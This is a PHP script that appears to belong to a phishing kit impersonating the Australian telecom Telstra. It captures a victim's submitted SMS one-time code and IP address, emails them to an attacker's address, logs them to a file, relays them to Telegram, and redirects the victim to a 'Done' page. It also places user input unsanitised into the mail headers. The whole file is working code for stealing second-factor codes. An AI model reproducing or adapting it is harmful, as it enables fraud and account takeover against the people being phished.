<?php
include('Email.php');
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------------------------------------\n";
$message .= "SMS 2   : ".$_POST['otp']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------------------------------------\n";




$subject = "SMS 2 | $ip ]";
$headers = "From: Telstra";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($FLOW_EMAIL,$subject,$message,$headers);
$file = fopen('../Flow.txt', 'a');
fwrite($file,$message);

telegram_send(urlencode($message));

header("Location: Done.php");

?>
